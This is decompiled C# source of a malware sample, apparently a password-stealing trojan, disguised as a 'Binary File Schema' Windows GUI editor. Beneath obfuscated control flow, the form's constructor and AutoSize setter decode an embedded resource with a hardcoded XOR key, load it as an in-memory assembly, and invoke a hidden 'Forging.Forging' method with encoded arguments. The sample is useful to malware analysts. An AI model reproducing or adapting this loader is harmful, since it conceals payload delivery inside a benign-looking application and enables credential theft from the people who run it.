// Decompiled with JetBrains decompiler
// Type: wG.vGn
// Assembly: Type, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 716CE3A9-BAD1-470D-912F-B421D403F66E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee62dc596e4b4fe76f8e015ac250d696a483f656ebb02d02815520b3fd560e30.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace wG
{
  public class vGn : Form
  {
    private mI f45;
    private string M4c;
    private IContainer F4n;
    private static object l4D;
    private ToolStrip g4r;
    private ToolStripButton C4s;
    private OpenFileDialog V4E;
    private SplitContainer I4U;
    private ToolStripButton s4h;
    private SplitContainer d4O;
    private TreeView z4i;
    private ImageList B4L;
    private ListView o4C;
    private ColumnHeader H4S;
    private ImageList X4v;
    private hGr v4X;
    private ToolStripButton c4b;
    private ToolStripSeparator d43;
    private ToolStripButton i40;
    private ToolStripButton T4M;
    private ToolStripComboBox q4o;
    private ToolStripSeparator E46;
    private ToolStripButton Y4l;
    private SaveFileDialog t4t;
    private static vGn b4q;

    public vGn()
    {
      XTG.fvQjdC();
      this.M4c = string.Empty;
      this.F4n = (IContainer) null;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.c4Z();
      MethodInfo method = ((System.Type) vGn.l4D).GetMethod("DictionaryEnumerator");
      int num1 = 0;
      if (true)
        goto label_3;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_2;
          case 1:
            string[] strArray = new string[3]
            {
              "4669787570486F6C",
              "4D6575735A7A",
              "BinaryFileSchemaGUI"
            };
            vGn.w4O((object) method, (object) 0, (object) (object[]) strArray);
            int num2;
            num1 = true ? 0 : num2;
            continue;
          default:
            goto label_5;
        }
      }
label_2:
      return;
label_5:
      return;
label_3:
      num1 = 1;
      goto label_1;
    }

    private void H4N(object _param1, EventArgs _param2)
    {
      vGn.z4v((object) this.q4o.Items, (object) new oGJ());
      this.q4o.SelectedIndex = 0;
    }

    private void s4g(object _param1, EventArgs _param2) => this.g47();

    private void F4V(object _param1, EventArgs _param2)
    {
      if (this.V4E.ShowDialog() != DialogResult.OK)
        return;
      this.E4x(this.V4E.FileName);
      this.g47();
      int num1 = 0;
      if (!vGn.x4y())
        goto label_4;
label_1:
      switch (num1)
      {
        default:
          return;
      }
label_4:
      int num2;
      num1 = num2;
      goto label_1;
    }

    private void E4x(string _param1)
    {
      if (vGn.r4p((object) _param1))
        goto label_4;
      else
        goto label_5;
label_1:
      int num1;
      switch (num1)
      {
        case 0:
          return;
        case 1:
          return;
        default:
          return;
      }
label_4:
      StreamReader streamReader = new StreamReader(_param1);
      this.v4X.Text = streamReader.ReadToEnd();
      streamReader.Close();
      vGn.G4M((object) this.v4X, 0, 0);
      this.M4c = _param1;
      vGn.W4K((object) this.Y4l, true);
      num1 = 1;
      if (vGn.G4u() != null)
      {
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
        goto label_1;
label_5:
      num1 = vGn.G4u() == null ? 0 : 0;
      goto label_1;
    }

    private void g47()
    {
      this.v4X.X2f(false);
      this.z4i.BeginUpdate();
      this.o4C.BeginUpdate();
      int num1 = 2;
      mI mI;
      fGV fGv1;
      Stopwatch stopwatch;
      while (true)
      {
        string text;
        switch (num1)
        {
          case 1:
            ((ListView.ListViewItemCollection) vGn.g4X((object) this.o4C)).Clear();
            this.z4i.Nodes.Clear();
            stopwatch = new Stopwatch();
            stopwatch.Start();
            mI = RG2.a9Y(text, fGv1);
            stopwatch.Stop();
            if (vGn.G4u() == null)
            {
              num1 = 0;
              continue;
            }
            break;
          case 2:
            fGv1 = (fGV) new AGs(this.o4C);
            text = this.v4X.Text;
            num1 = vGn.x4y() ? 1 : 1;
            continue;
          case 3:
            this.T4M.Enabled = false;
            if (vGn.x4y())
            {
              num1 = 4;
              continue;
            }
            break;
          case 4:
            goto label_8;
          default:
            if (mI == null)
              goto case 3;
            else
              goto label_7;
        }
        int num2;
        num1 = num2;
      }
label_7:
      fGV fGv2 = fGv1;
      string[] strArray = new string[5]
      {
        "Parsed and processed in ",
        null,
        null,
        null,
        null
      };
      long num3 = stopwatch.ElapsedMilliseconds;
      strArray[1] = num3.ToString();
      strArray[2] = " milliseconds (";
      num3 = stopwatch.ElapsedTicks;
      strArray[3] = num3.ToString();
      strArray[4] = " ticks)";
      string str = string.Concat(strArray);
      fGv2.uC8(str);
      this.F4I(mI);
      gGh.I2N(mI, (RichTextBox) this.v4X);
      vGn.W4K((object) this.T4M, true);
      this.f45 = mI;
label_8:
      this.v4X.X2f(true);
      this.z4i.EndUpdate();
      this.o4C.EndUpdate();
    }

    private string x4Y(C9 _param1, string _param2) => _param2.Substring(_param1.eGy.bGa, _param1.eGy.UGT()).Trim();

    private void c4Q(object _param1, TreeViewEventArgs _param2)
    {
      Au tag = _param2.Node.Tag as Au;
      bool flag = tag != null;
      int num1 = 0;
      if (!vGn.x4y())
        goto label_3;
label_1:
      switch (num1)
      {
        default:
          if (flag)
          {
            hGr v4X = this.v4X;
            Xp xp = tag.f19();
            int num2 = xp.deI();
            xp = vGn.T4d((object) tag);
            int num3 = xp.reu();
            vGn.G4M((object) v4X, num2, num3);
            return;
          }
          this.o4C.Items.Add("Error! No range was stored in the nodes!", 0);
          return;
      }
label_3:
      int num4;
      num1 = num4;
      goto label_1;
    }

    private void F4I(mI _param1)
    {
      using (IEnumerator<MW> enumerator1 = _param1.Kek().GetEnumerator())
      {
label_32:
        while (enumerator1.MoveNext())
        {
label_14:
          MW current1 = enumerator1.Current;
          TreeNode treeNode1 = this.z4i.Nodes.Add((string) vGn.z4a((object) current1));
          vGn.d4W((object) treeNode1, (object) current1);
          treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 0;
          int num1;
          switch (current1)
          {
            case PK _:
              if (current1 is BP)
                vGn.v4Y((object) treeNode1, treeNode1.SelectedImageIndex = 1);
              using (Dictionary<string, G6>.ValueCollection.Enumerator enumerator2 = (current1 as PK).ACA().Values.GetEnumerator())
              {
                while (enumerator2.MoveNext())
                {
                  G6 current2 = enumerator2.Current;
                  TreeNode treeNode2 = treeNode1.Nodes.Add(current2.ToString());
                  vGn.d4W((object) treeNode2, (object) current2);
                  treeNode2.ImageIndex = treeNode2.SelectedImageIndex = 4;
                  int num2 = 0;
                  if (vGn.G4u() == null)
                    goto label_38;
label_34:
                  switch (num2)
                  {
                    default:
                      continue;
                  }
label_38:
                  num2 = 0;
                  goto label_34;
                }
                goto default;
              }
            case Ph _:
              if (vGn.x4y())
              {
                num1 = 0;
                goto label_3;
              }
              else
                break;
            case yO _:
              treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 3;
              using (IEnumerator<B8> enumerator3 = (current1 as yO).BfJ().GetEnumerator())
              {
                while (enumerator3.MoveNext())
                {
                  B8 current3 = enumerator3.Current;
                  TreeNode treeNode3 = treeNode1.Nodes.Add(current3.ToString());
                  vGn.d4W((object) treeNode3, (object) current3);
                  int num3 = 0;
                  if (vGn.G4u() != null)
                    goto label_10;
label_5:
                  switch (num3)
                  {
                    default:
                      treeNode3.ImageIndex = treeNode3.SelectedImageIndex = 4;
                      continue;
                  }
label_10:
                  num3 = 0;
                  goto label_5;
                }
                goto default;
              }
            default:
label_21:
              treeNode1.Expand();
              num1 = 1;
              if (vGn.x4y())
                goto label_3;
              else
                break;
          }
          int num4;
          num1 = num4;
label_3:
          while (true)
          {
            switch (num1)
            {
              case 1:
                goto label_32;
              case 2:
                goto label_17;
              case 3:
                goto label_21;
              case 4:
                goto label_14;
              default:
                treeNode1.ImageIndex = treeNode1.SelectedImageIndex = 2;
                num1 = !vGn.x4y() ? 2 : 2;
                continue;
            }
          }
label_17:
          using (IEnumerator<Hl> enumerator4 = (current1 as Ph).NfN().GetEnumerator())
          {
            while (enumerator4.MoveNext())
            {
              Hl current4 = enumerator4.Current;
              int num5 = 0;
              if (vGn.G4u() != null)
                goto label_26;
label_23:
              switch (num5)
              {
                default:
                  TreeNode treeNode4 = treeNode1.Nodes.Add(current4.ToString());
                  treeNode4.Tag = (object) current4;
                  treeNode4.ImageIndex = treeNode4.SelectedImageIndex = 4;
                  continue;
              }
label_26:
              num5 = 0;
              goto label_23;
            }
            goto label_21;
          }
        }
      }
    }

    private void W41(object _param1, EventArgs _param2)
    {
      if (this.o4C.SelectedItems.Count != 0)
        goto label_5;
      else
        goto label_9;
label_1:
      string[] strArray;
      int lineNumber;
      int start;
      int length;
      int num1;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_10;
          case 2:
            goto label_12;
          case 3:
            goto label_8;
          default:
            int.Parse(strArray[1]);
            start = Math.Max(this.v4X.GetFirstCharIndexFromLine(lineNumber), 0);
            length = vGn.HrP(this.v4X.GetFirstCharIndexFromLine(lineNumber + 1) - start, 0);
            int num2;
            num1 = vGn.x4y() ? 3 : num2;
            continue;
        }
      }
label_10:
      return;
label_8:
      this.v4X.Select(start, length);
      this.v4X.Focus();
      goto label_2;
label_12:
      this.v4X.Focus();
      return;
label_2:
      return;
label_5:
      if (this.o4C.SelectedItems[0].Tag is iGx)
      {
        iGx tag = this.o4C.SelectedItems[0].Tag as iGx;
        hGr v4X = this.v4X;
        Xp xp = vGn.n4T((object) tag);
        int num3 = xp.deI();
        xp = tag.Q9q();
        int num4 = xp.reu();
        vGn.G4M((object) v4X, num3, num4);
        num1 = vGn.G4u() == null ? 2 : 0;
        goto label_1;
      }
      else
      {
        string text = ((ListViewItem) vGn.zr6(vGn.W4z((object) this.o4C), 0)).Text;
        if (vGn.Wrb((object) text, (object) "<"))
        {
          strArray = (string[]) vGn.prm((object) text, (object) "<,>".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
          lineNumber = Math.Max(int.Parse(strArray[0]) - 1, 0);
          num1 = 0;
          if (vGn.x4y())
          {
            num1 = 0;
            goto label_1;
          }
          else
            goto label_1;
        }
        else
          goto label_2;
      }
label_9:
      num1 = vGn.G4u() == null ? 1 : 0;
      goto label_1;
    }

    private void F4p(object _param1, EventArgs _param2)
    {
      this.v4X.Clear();
      this.T4M.Enabled = false;
      this.M4c = string.Empty;
    }

    private void z4u(object _param1, EventArgs _param2)
    {
      int num = (int) MessageBox.Show("Binary File Schema - By Anders Riggelsen, www.andersriggelsen.dk", "About Binary File Schema", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void P4W(object _param1, EventArgs _param2)
    {
      int num = (int) new yGD((this.q4o.SelectedItem as iGg).xCy(this.f45), (string) vGn.z4a((object) this.f45.uem())).ShowDialog();
    }

    private void v4K(object _param1, EventArgs _param2)
    {
      int num = 2;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 1:
            if (flag)
            {
              if (this.t4t.ShowDialog() == DialogResult.OK)
                this.M4c = this.t4t.FileName;
              else
                goto label_6;
            }
            StreamWriter streamWriter = new StreamWriter(this.M4c);
            streamWriter.Write((string) vGn.cri((object) this.v4X));
            streamWriter.Close();
            num = vGn.G4u() != null ? 0 : 0;
            continue;
          case 2:
            flag = this.M4c == string.Empty;
            num = vGn.G4u() != null ? 0 : 1;
            continue;
          default:
            goto label_2;
        }
      }
label_2:
      return;
label_6:;
    }

    protected override void Dispose(bool _param1)
    {
      if (_param1 && this.F4n != null)
        goto label_4;
label_3:
      vGn.BrH((object) this, _param1);
      return;
label_4:
      this.F4n.Dispose();
      int num1 = 0;
      if (!vGn.x4y())
        goto label_5;
label_1:
      switch (num1)
      {
        default:
          goto label_3;
      }
label_5:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public override bool AutoSize
    {
      get => base.AutoSize;
      set => vGn.E4P();
    }

    private static bool E4P()
    {
      byte[] numArray = (byte[]) new ResourceManager(typeof (yGD)).GetObject("SlowTech");
      string str = "AF94H5HH4V78J887ZB54FD";
      int num1 = 69654;
      bool flag;
      while (true)
      {
        if (num1 >= 0)
          goto label_4;
        else
          goto label_6;
label_1:
        int num2;
        switch (num2)
        {
          case 1:
            num1 += -1;
            continue;
          default:
            goto label_2;
        }
label_4:
        numArray[num1 % 34816] = vGn.@int((vGn.e4J((int) numArray[num1 % 34816] ^ (int) str[num1 % 22]) - vGn.e4J((int) numArray[(num1 + 1) % 34816]) + 256) % 256);
        num2 = 1;
        if (!vGn.x4y())
        {
          num2 = 1;
          goto label_1;
        }
        else
          goto label_1;
label_6:
        vGn.L4q(vGn.Q4w(numArray));
        flag = true;
        num2 = vGn.G4u() != null ? 0 : 0;
        goto label_1;
      }
label_2:
      return flag;
    }

    private static int e4J(int _param0) => _param0;

    private static byte @int(int x) => (byte) x;

    private static object Q4w(byte[] _param0) => (object) Assembly.Load(_param0);

    private static void L4q(object _param0) => vGn.l4D = (object) vGn.krN((object) (Assembly) _param0, (object) "Forging.Forging");

    private void c4Z()
    {
      this.F4n = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (vGn));
      this.g4r = new ToolStrip();
      this.c4b = new ToolStripButton();
      this.s4h = new ToolStripButton();
      this.Y4l = new ToolStripButton();
      this.d43 = new ToolStripSeparator();
      this.C4s = new ToolStripButton();
      this.E46 = new ToolStripSeparator();
      this.q4o = new ToolStripComboBox();
      this.T4M = new ToolStripButton();
      this.i40 = new ToolStripButton();
      this.V4E = new OpenFileDialog();
      int num1 = 16;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 1:
            this.v4X = new hGr();
            if (vGn.G4u() == null)
            {
              num1 = 22;
              continue;
            }
            break;
          case 2:
            this.o4C.MultiSelect = false;
            this.o4C.Name = "listViewErrorBox";
            vGn.PrC((object) this.o4C, false);
            this.o4C.Size = new Size(525, 147);
            this.o4C.SmallImageList = this.X4v;
            this.o4C.TabIndex = 1;
            this.o4C.UseCompatibleStateImageBehavior = false;
            num1 = 24;
            continue;
          case 3:
            this.Y4l.Image = (Image) vGn.Pr1();
            this.Y4l.ImageTransparentColor = Color.Magenta;
            vGn.XrG((object) this.Y4l, (object) "toolSaveSchema");
            this.Y4l.Size = new Size(51, 22);
            this.Y4l.Text = "Save";
            this.Y4l.Click += new EventHandler(this.v4K);
            this.d43.Name = "toolStripSeparator1";
            this.d43.Size = new Size(6, 25);
            num1 = 4;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated method
            this.C4s.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.y2h();
            this.C4s.ImageTransparentColor = Color.Magenta;
            this.C4s.Name = "toolCompileSchema";
            num1 = 33;
            continue;
          case 5:
            this.d4O.SuspendLayout();
            if (vGn.G4u() == null)
            {
              num1 = 30;
              continue;
            }
            break;
          case 6:
            this.z4i.AfterSelect += new TreeViewEventHandler(this.c4Q);
            this.B4L.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imgListBlocks.ImageStream");
            this.B4L.TransparentColor = Color.Transparent;
            num1 = 34;
            continue;
          case 7:
            this.H4S.Width = 521;
            num1 = 31;
            continue;
          case 8:
            goto label_27;
          case 9:
            this.X4v.Images.SetKeyName(0, "information.png");
            vGn.Vrt((object) this.X4v.Images, 1, (object) "error.png");
            ((ImageList.ImageCollection) vGn.Lr7((object) this.X4v)).SetKeyName(2, "stop.png");
            vGn.orR((object) this.d4O, DockStyle.Fill);
            this.d4O.FixedPanel = FixedPanel.Panel2;
            vGn.Br9((object) this.d4O, new Point(0, 25));
            this.d4O.Name = "splitContainer2";
            this.d4O.Panel1.BackColor = SystemColors.Control;
            this.d4O.Panel1.Controls.Add((Control) this.I4U);
            vGn.zre((object) this.d4O.Panel2.Controls, (object) this.z4i);
            vGn.FrF((object) this.d4O, new Size(720, 430));
            num1 = 15;
            continue;
          case 10:
            this.AutoSize = false;
            this.g4r.Items.AddRange(new ToolStripItem[9]
            {
              (ToolStripItem) this.c4b,
              (ToolStripItem) this.s4h,
              (ToolStripItem) this.Y4l,
              (ToolStripItem) this.d43,
              (ToolStripItem) this.C4s,
              (ToolStripItem) this.E46,
              (ToolStripItem) this.q4o,
              (ToolStripItem) this.T4M,
              (ToolStripItem) this.i40
            });
            if (vGn.x4y())
            {
              num1 = 27;
              continue;
            }
            break;
          case 11:
            this.o4C.Dock = DockStyle.Fill;
            this.o4C.HeaderStyle = ColumnHeaderStyle.Nonclickable;
            num1 = 21;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated method
            this.i40.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.x2b();
            this.i40.ImageTransparentColor = Color.Magenta;
            this.i40.Name = "toolAbout";
            this.i40.Size = new Size(60, 22);
            num2 = 23;
            break;
          case 13:
            this.v4X.WordWrap = false;
            this.o4C.Columns.AddRange(new ColumnHeader[1]
            {
              this.H4S
            });
            if (vGn.G4u() == null)
            {
              num1 = 11;
              continue;
            }
            break;
          case 14:
            this.v4X.HideSelection = false;
            vGn.Br9((object) this.v4X, new Point(0, 0));
            this.v4X.Name = "richTextBox";
            this.v4X.Size = new Size(525, 279);
            this.v4X.TabIndex = 0;
            this.v4X.Text = "";
            if (vGn.x4y())
            {
              num1 = 13;
              continue;
            }
            break;
          case 15:
            this.d4O.SplitterDistance = 525;
            this.d4O.TabIndex = 3;
            this.z4i.Dock = DockStyle.Fill;
            this.z4i.ImageKey = "page_white_text.png";
            this.z4i.ImageList = this.B4L;
            this.z4i.Location = new Point(0, 0);
            this.z4i.Name = "treeBFSstructure";
            this.z4i.SelectedImageIndex = 0;
            vGn.FrF((object) this.z4i, new Size(191, 430));
            this.z4i.TabIndex = 0;
            num1 = vGn.G4u() != null ? 5 : 6;
            continue;
          case 16:
            this.I4U = new SplitContainer();
            if (vGn.G4u() == null)
            {
              num1 = 1;
              continue;
            }
            break;
          case 17:
            vGn.Qrh((object) this.g4r, false);
            this.g4r.PerformLayout();
            ((Control) vGn.urn((object) this.I4U)).ResumeLayout(false);
            vGn.Qrh((object) this.I4U.Panel2, false);
            this.I4U.ResumeLayout(false);
            num1 = 37;
            continue;
          case 18:
            this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
            this.Name = "BFSGUI";
            this.Text = "Binary File Schema";
            this.Load += new EventHandler(this.H4N);
            num1 = 17;
            continue;
          case 19:
            this.t4t = new SaveFileDialog();
            this.g4r.SuspendLayout();
            this.I4U.Panel1.SuspendLayout();
            vGn.lr4((object) this.I4U.Panel2);
            this.I4U.SuspendLayout();
            this.d4O.Panel1.SuspendLayout();
            vGn.lr4((object) this.d4O.Panel2);
            if (vGn.x4y())
            {
              num1 = 5;
              continue;
            }
            break;
          case 20:
            this.B4L.Images.SetKeyName(3, "brick.png");
            ((ImageList.ImageCollection) vGn.Lr7((object) this.B4L)).SetKeyName(4, "bullet_blue.png");
            this.t4t.FileName = "*.fsc";
            this.t4t.Filter = "Binary File Schemas|*.fsc|All files|*.*";
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = 26;
            continue;
          case 21:
            this.o4C.HideSelection = false;
            this.o4C.Location = new Point(0, 0);
            if (vGn.G4u() == null)
            {
              num1 = 2;
              continue;
            }
            break;
          case 22:
            this.o4C = new ListView();
            this.H4S = new ColumnHeader();
            this.X4v = new ImageList(this.F4n);
            this.d4O = new SplitContainer();
            this.z4i = new TreeView();
            num1 = vGn.x4y() ? 28 : 20;
            continue;
          case 23:
            this.i40.Text = "About";
            this.i40.ToolTipText = "About";
            this.i40.Visible = false;
            this.i40.Click += new EventHandler(this.z4u);
            this.V4E.FileName = "*.fsc";
            this.V4E.Filter = "Binary File Schemas|*.fsc|All files|*.*";
            this.I4U.Dock = DockStyle.Fill;
            this.I4U.FixedPanel = FixedPanel.Panel2;
            num1 = 25;
            continue;
          case 24:
            this.o4C.View = View.Details;
            this.o4C.ItemActivate += new EventHandler(this.W41);
            this.H4S.Text = "Message";
            num1 = 7;
            continue;
          case 25:
            this.I4U.Location = new Point(0, 0);
            this.I4U.Name = "splitContainer1";
            vGn.hrl((object) this.I4U, Orientation.Horizontal);
            ((Control.ControlCollection) vGn.Rrs(vGn.urn((object) this.I4U))).Add((Control) this.v4X);
            ((Control) vGn.qrV((object) this.I4U)).Controls.Add((Control) this.o4C);
            this.I4U.Size = new Size(525, 430);
            this.I4U.SplitterDistance = 279;
            this.I4U.TabIndex = 2;
            this.v4X.AcceptsTab = true;
            this.v4X.X2f(true);
            this.v4X.Dock = DockStyle.Fill;
            this.v4X.Font = new Font("Courier New", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.v4X.ForeColor = Color.Black;
            num1 = 14;
            continue;
          case 26:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(720, 455);
            this.Controls.Add((Control) this.d4O);
            vGn.zre((object) this.Controls, (object) this.g4r);
            num1 = 18;
            continue;
          case 27:
            this.g4r.Location = new Point(0, 0);
            this.g4r.Name = "toolStrip1";
            this.g4r.Size = new Size(720, 25);
            this.g4r.TabIndex = 1;
            vGn.Mrr((object) this.g4r, (object) "toolStrip1");
            // ISSUE: reference to a compiler-generated method
            this.c4b.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.d20();
            this.c4b.ImageTransparentColor = Color.Magenta;
            this.c4b.Name = "toolNewSchema";
            num1 = !vGn.x4y() ? 17 : 32;
            continue;
          case 28:
            this.B4L = new ImageList(this.F4n);
            if (vGn.x4y())
            {
              num1 = 19;
              continue;
            }
            break;
          case 29:
            this.q4o.DropDownWidth = 64;
            this.q4o.Name = "toolComboLanguage";
            if (vGn.x4y())
            {
              num1 = 38;
              continue;
            }
            break;
          case 30:
            this.SuspendLayout();
            num1 = 10;
            continue;
          case 31:
            vGn.UrD((object) this.X4v, (object) (ImageListStreamer) componentResourceManager.GetObject("imageListErrorIcons.ImageStream"));
            if (vGn.G4u() == null)
            {
              num1 = 0;
              continue;
            }
            break;
          case 32:
            vGn.KrZ((object) this.c4b, new Size(51, 22));
            this.c4b.Text = "New";
            this.c4b.ToolTipText = "New Schema";
            this.c4b.Click += new EventHandler(this.F4p);
            // ISSUE: reference to a compiler-generated method
            this.s4h.Image = (Image) BinaryFileSchemaGUI.Properties.Resources.h2v();
            this.s4h.ImageTransparentColor = Color.Magenta;
            vGn.XrG((object) this.s4h, (object) "toolOpenSchema");
            this.s4h.Size = new Size(56, 22);
            num1 = 36;
            continue;
          case 33:
            this.C4s.Size = new Size(72, 22);
            vGn.or3((object) this.C4s, (object) "Compile");
            this.C4s.Click += new EventHandler(this.s4g);
            this.E46.Name = "toolStripSeparator2";
            vGn.KrZ((object) this.E46, new Size(6, 25));
            this.q4o.DropDownStyle = ComboBoxStyle.DropDownList;
            if (vGn.G4u() == null)
            {
              num1 = 29;
              continue;
            }
            break;
          case 34:
            this.B4L.Images.SetKeyName(0, "database.png");
            num2 = 35;
            break;
          case 35:
            this.B4L.Images.SetKeyName(1, "database_go.png");
            this.B4L.Images.SetKeyName(2, "comments.png");
            num2 = 20;
            break;
          case 36:
            vGn.or3((object) this.s4h, (object) "Open");
            vGn.vrJ((object) this.s4h, (object) new EventHandler(this.F4V));
            num1 = 3;
            continue;
          case 37:
            this.d4O.Panel1.ResumeLayout(false);
            vGn.Qrh((object) this.d4O.Panel2, false);
            this.d4O.ResumeLayout(false);
            this.ResumeLayout(false);
            num1 = 8;
            continue;
          case 38:
            this.q4o.Size = new Size(75, 25);
            vGn.W4K((object) this.T4M, false);
            // ISSUE: reference to a compiler-generated method
            vGn.br8((object) this.T4M, (object) BinaryFileSchemaGUI.Properties.Resources.C2E());
            this.T4M.ImageTransparentColor = Color.Magenta;
            this.T4M.Name = "toolGenerateCode";
            this.T4M.Size = new Size(103, 22);
            vGn.or3((object) this.T4M, (object) "Generate code");
            this.T4M.Click += new EventHandler(this.P4W);
            num1 = 12;
            continue;
          default:
            this.X4v.TransparentColor = Color.Transparent;
            num1 = 9;
            continue;
        }
        num1 = num2;
      }
label_27:
      this.PerformLayout();
    }

    internal static object w4O([In] object obj0, [In] object obj1, [In] object obj2) => ((MethodBase) obj0).Invoke(obj1, (object[]) obj2);

    internal static bool x4y() => vGn.b4q == null;

    internal static vGn G4u() => vGn.b4q;

    internal static int z4v([In] object obj0, [In] object obj1) => ((ComboBox.ObjectCollection) obj0).Add(obj1);

    internal static bool r4p([In] object obj0) => File.Exists((string) obj0);

    internal static void G4M([In] object obj0, [In] int obj1, [In] int obj2) => ((TextBoxBase) obj0).Select(obj1, obj2);

    internal static void W4K([In] object obj0, [In] bool obj1) => ((ToolStripItem) obj0).Enabled = obj1;

    internal static object g4X([In] object obj0) => (object) ((ListView) obj0).Items;

    internal static Xp T4d([In] object obj0) => ((Au) obj0).f19();

    internal static object z4a([In] object obj0) => (object) ((MW) obj0).T1V();

    internal static void d4W([In] object obj0, [In] object obj1) => ((TreeNode) obj0).Tag = obj1;

    internal static void v4Y([In] object obj0, [In] int obj1) => ((TreeNode) obj0).ImageIndex = obj1;

    internal static Xp n4T([In] object obj0) => ((iGx) obj0).Q9q();

    internal static object W4z([In] object obj0) => (object) ((ListView) obj0).SelectedItems;

    internal static object zr6([In] object obj0, [In] int obj1) => (object) ((ListView.SelectedListViewItemCollection) obj0)[obj1];

    internal static bool Wrb([In] object obj0, [In] object obj1) => ((string) obj0).StartsWith((string) obj1);

    internal static object prm([In] object obj0, [In] object obj1, [In] StringSplitOptions obj2) => (object) ((string) obj0).Split((char[]) obj1, obj2);

    internal static int HrP([In] int obj0, [In] int obj1) => Math.Max(obj0, obj1);

    internal static object cri([In] object obj0) => (object) ((Control) obj0).Text;

    internal static void BrH([In] object obj0, [In] bool obj1) => __nonvirtual (((Form) obj0).Dispose(obj1));

    internal static System.Type krN([In] object obj0, [In] object obj1) => ((Assembly) obj0).GetType((string) obj1);

    internal static void lr4([In] object obj0) => ((Control) obj0).SuspendLayout();

    internal static void Mrr([In] object obj0, [In] object obj1) => ((Control) obj0).Text = (string) obj1;

    internal static void KrZ([In] object obj0, [In] Size obj1) => ((ToolStripItem) obj0).Size = obj1;

    internal static void XrG([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Name = (string) obj1;

    internal static void or3([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Text = (string) obj1;

    internal static void vrJ([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Click += (EventHandler) obj1;

    internal static object Pr1() => (object) BinaryFileSchemaGUI.Properties.Resources.t2C();

    internal static void br8([In] object obj0, [In] object obj1) => ((ToolStripItem) obj0).Image = (Image) obj1;

    internal static void hrl([In] object obj0, [In] Orientation obj1) => ((SplitContainer) obj0).Orientation = obj1;

    internal static object urn([In] object obj0) => (object) ((SplitContainer) obj0).Panel1;

    internal static object Rrs([In] object obj0) => (object) ((Control) obj0).Controls;

    internal static object qrV([In] object obj0) => (object) ((SplitContainer) obj0).Panel2;

    internal static void Br9([In] object obj0, [In] Point obj1) => ((Control) obj0).Location = obj1;

    internal static void PrC([In] object obj0, [In] bool obj1) => ((ListView) obj0).ShowGroups = obj1;

    internal static void UrD([In] object obj0, [In] object obj1) => ((ImageList) obj0).ImageStream = (ImageListStreamer) obj1;

    internal static void Vrt([In] object obj0, [In] int obj1, [In] object obj2) => ((ImageList.ImageCollection) obj0).SetKeyName(obj1, (string) obj2);

    internal static object Lr7([In] object obj0) => (object) ((ImageList) obj0).Images;

    internal static void orR([In] object obj0, [In] DockStyle obj1) => ((SplitContainer) obj0).Dock = obj1;

    internal static void zre([In] object obj0, [In] object obj1) => ((Control.ControlCollection) obj0).Add((Control) obj1);

    internal static void FrF([In] object obj0, [In] Size obj1) => ((Control) obj0).Size = obj1;

    internal static void Qrh([In] object obj0, [In] bool obj1) => ((Control) obj0).ResumeLayout(obj1);
  }
}
